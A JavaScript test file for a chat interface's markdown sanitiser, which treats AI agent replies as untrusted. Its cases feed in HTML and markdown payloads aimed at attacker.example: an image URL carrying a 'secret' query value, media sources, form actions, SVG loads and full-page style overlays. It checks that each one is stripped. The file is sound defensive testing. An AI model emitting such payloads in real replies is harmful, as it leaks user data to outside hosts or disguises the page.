// @ts-check
// @vitest-environment jsdom
/**
 * Agent markdown is untrusted: what survives sanitising (chat-markdown.js):
 *   npx vitest run tests/interfaces/web_terminal/chat-markdown.test.mjs
 *
 * Runs on jsdom with the real marked and DOMPurify (see
 * agent-links-vendored.test.mjs for why happy-dom proves nothing for a
 * sanitiser). Each case is a way a prompt-injected reply could load something
 * from another site the moment it renders, or paint over the page.
 */

import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { afterEach, beforeAll, beforeEach, describe, expect, test, vi } from 'vitest';

import { renderMarkdownInto } from '../../../src/osprey/interfaces/web_terminal/static/js/chat-markdown.js';

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../..');

/**
 * Evaluate a UMD build as a classic `<script>` would, and take its global back.
 * @param {string} name
 * @param {string} file - relative to the repo root
 * @returns {any}
 */
function loadClassicScript(name, file) {
  const source = readFileSync(path.join(REPO_ROOT, file), 'utf8');
  new Function('exports', 'module', 'define', 'require', source)();
  const g = /** @type {any} */ (globalThis);
  const lib = g[name];
  delete g[name];
  return lib;
}

/** @type {{ marked: any, DOMPurify: any }} */
let real;
/** @type {HTMLElement} */
let el;

beforeAll(() => {
  real = {
    marked: loadClassicScript('marked', 'node_modules/marked/marked.min.js'),
    DOMPurify: loadClassicScript('DOMPurify', 'node_modules/dompurify/dist/purify.min.js'),
  };
});

beforeEach(() => {
  vi.stubGlobal('marked', real.marked);
  vi.stubGlobal('DOMPurify', real.DOMPurify);
  el = document.createElement('div');
});

afterEach(() => {
  vi.unstubAllGlobals();
});

/** @param {string} md */
const render = (md) => renderMarkdownInto(el, md, { math: true, svg: true });

describe('a picture or media element in a reply', () => {
  test('from another site is removed, so rendering sends nothing out', () => {
    render('before ![x](https://attacker.example/x.png?d=secret) after');
    expect(el.querySelector('img')).toBeNull();
    expect(el.innerHTML).not.toContain('attacker.example');
    expect(el.textContent).toContain('before');
    expect(el.textContent).toContain('after');
  });

  test.each([
    ['a protocol-relative image', '<img src="//attacker.example/x.png">'],
    [
      'an image with an outside srcset',
      '<img src="/ok.png" srcset="https://attacker.example/x.png 2x">',
    ],
    ['a data image', '<img src="data:image/png;base64,AAAA">'],
    ['a video poster', '<video src="/v.mp4" poster="https://attacker.example/p.png"></video>'],
    ['a video', '<video src="https://attacker.example/v.mp4"></video>'],
    ['an audio source', '<audio><source src="https://attacker.example/a.mp3"></audio>'],
    ['a track', '<video src="/v.mp4"><track src="https://attacker.example/t.vtt"></video>'],
    [
      'a picture source',
      '<picture><source srcset="https://attacker.example/x.png"><img src="/ok.png"></picture>',
    ],
  ])('%s is removed', (_case, html) => {
    render(`text\n\n${html}\n\nmore`);
    expect(el.innerHTML).not.toContain('attacker.example');
    expect(el.innerHTML).not.toContain('data:image');
    expect(el.innerHTML).not.toContain('srcset');
  });

  test("from the page's own origin stays", () => {
    render(
      `![chart](${location.origin}/api/artifacts/abc/chart.png) ![rel](/api/artifacts/abc/b.png)`
    );
    const srcs = [...el.querySelectorAll('img')].map((i) => i.getAttribute('src'));
    expect(srcs).toEqual([
      `${location.origin}/api/artifacts/abc/chart.png`,
      '/api/artifacts/abc/b.png',
    ]);
  });
});

describe('what a reply may not paint or ask with', () => {
  test('an inline style is stripped, so nothing can be laid over the page', () => {
    render(
      '<div style="position:fixed;inset:0;background:red">cover</div>\n\n<p style="color:red">x</p>'
    );
    expect(el.querySelector('[style]')).toBeNull();
    expect(el.textContent).toContain('cover');
  });

  test('a style element and a background attribute are stripped', () => {
    render(
      '<style>body{background:url(https://attacker.example/b)}</style>\n\n<table background="https://attacker.example/t"><tr><td background="https://attacker.example/c">x</td></tr></table>'
    );
    expect(el.querySelector('style')).toBeNull();
    expect(el.querySelector('[background]')).toBeNull();
    expect(el.innerHTML).not.toContain('attacker.example');
  });

  test.each(['form', 'input', 'button', 'select', 'textarea'])('a %s is stripped', (tag) => {
    render(
      `<form action="https://attacker.example/f"><${tag} name="a" formaction="https://attacker.example/g">x</${tag}></form>`
    );
    expect(el.querySelector(tag)).toBeNull();
    expect(el.querySelector('form')).toBeNull();
    expect(el.innerHTML).not.toContain('attacker.example');
  });

  test('inline svg and mathml, which can load from outside, are stripped', () => {
    render(
      '<svg><image href="https://attacker.example/x.png"/><rect fill="url(https://attacker.example/p)"/></svg>'
    );
    expect(el.querySelector('svg')).toBeNull();
    expect(el.innerHTML).not.toContain('attacker.example');
  });
});

describe('ordinary markdown still renders', () => {
  test('tables, code, lists, headings and http(s) links', () => {
    render(
      '# Title\n\n- a\n- b\n\n| h1 | h2 |\n|---|---|\n| c1 | c2 |\n\n```python\nprint(1)\n```\n\n[link](https://example.org/p) and `code`'
    );
    expect(el.querySelector('h1')?.textContent).toBe('Title');
    expect(el.querySelectorAll('li')).toHaveLength(2);
    expect(el.querySelectorAll('td')).toHaveLength(2);
    expect(el.querySelector('pre code')?.textContent).toContain('print(1)');
    expect(el.querySelector('a')?.getAttribute('href')).toBe('https://example.org/p');
  });

  test('math is typeset even though KaTeX writes style attributes', () => {
    const katex = {
      render: (/** @type {string} */ expr, /** @type {HTMLElement} */ node) => {
        node.innerHTML = `<span class="katex" style="height:1em">${expr}</span>`;
      },
    };
    vi.stubGlobal('katex', katex);
    render('Energy $E=mc^2$ here');
    expect(el.querySelector('.katex')?.getAttribute('style')).toBe('height:1em');
    expect(el.textContent).toContain('E=mc^2');
  });

  test('a later svg callout still passes through its own sanitiser', () => {
    render(
      '```svg\n<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1" fill="url(#g)"/></svg>\n```'
    );
    expect(el.querySelector('.op-svg-art svg rect')?.getAttribute('fill')).toBe('url(#g)');
  });
});

describe('math and code', () => {
  /** KaTeX stand-in: marks whatever it typesets. */
  beforeEach(() => {
    vi.stubGlobal('katex', {
      render: (/** @type {string} */ expr, /** @type {HTMLElement} */ node) => {
        node.className = 'katex';
        node.textContent = expr;
      },
    });
  });

  test('a bash fence still streaming, with no closing fence, is not typeset', () => {
    render('Add this:\n\n```bash\nexport PATH=$HOME/bin:$PATH');
    expect(el.querySelector('.katex')).toBeNull();
    expect(el.querySelector('pre code')?.textContent).toContain('export PATH=$HOME/bin:$PATH');
  });

  test('a closed fence is not typeset', () => {
    render('```bash\nexport PATH=$HOME/bin:$PATH\n```\n\nDone.');
    expect(el.querySelector('.katex')).toBeNull();
    expect(el.querySelector('pre code')?.textContent).toContain('$HOME/bin:$PATH');
  });

  test('a four-backtick fence around a three-backtick fence is not typeset', () => {
    render('````md\n```\n$x$ and $y$\n```\n````\n\nafter');
    expect(el.querySelector('.katex')).toBeNull();
    expect(el.querySelector('pre code')?.textContent).toContain('$x$ and $y$');
  });

  test('prose after a closed fence is still typeset', () => {
    render('```\n$a$\n```\n\nEnergy $E=mc^2$ here');
    expect([...el.querySelectorAll('.katex')].map((k) => k.textContent)).toEqual(['E=mc^2']);
  });

  test('prose math is still typeset', () => {
    render('Energy $E=mc^2$ and `$no$` here');
    expect([...el.querySelectorAll('.katex')].map((k) => k.textContent)).toEqual(['E=mc^2']);
    expect(el.querySelector('code')?.textContent).toBe('$no$');
  });

  test('an indented code block that held math gets its characters back, not a placeholder', () => {
    render('Run:\n\n    echo $a$ and $b$\n');
    expect(el.querySelector('.katex')).toBeNull();
    expect(el.querySelector('pre code')?.textContent).toContain('echo $a$ and $b$');
    expect(el.textContent).not.toContain('OSPREYMATH');
  });
});

describe('a table in a reply', () => {
  const WIDE = `| ${Array.from({ length: 12 }, (_, i) => `column ${i}`).join(' | ')} |\n|${' --- |'.repeat(12)}\n| ${Array.from({ length: 12 }, () => 'cell').join(' | ')} |`;

  test('sits in a box that scrolls sideways', () => {
    render(`Before\n\n${WIDE}\n\nAfter`);
    const box = el.querySelector('.osprey-md-table-scroll');
    expect(box?.children).toHaveLength(1);
    expect(box?.firstElementChild?.tagName).toBe('TABLE');
    expect(box?.querySelectorAll('th')).toHaveLength(12);
    expect(el.querySelectorAll('table')).toHaveLength(1);
  });

  test('is boxed again when the reply is drawn again as it streams', () => {
    render(WIDE.split('\n').slice(0, 2).join('\n'));
    render(WIDE);
    expect(el.querySelectorAll('.osprey-md-table-scroll')).toHaveLength(1);
    expect(el.querySelectorAll('.osprey-md-table-scroll > table')).toHaveLength(1);
    expect(el.querySelectorAll('td')).toHaveLength(12);
  });

  test('two tables each get a box, and a reply with none has no box', () => {
    render(`${WIDE}\n\ntext\n\n${WIDE}`);
    expect(el.querySelectorAll('.osprey-md-table-scroll')).toHaveLength(2);
    render('no table here');
    expect(el.querySelector('.osprey-md-table-scroll')).toBeNull();
  });
});
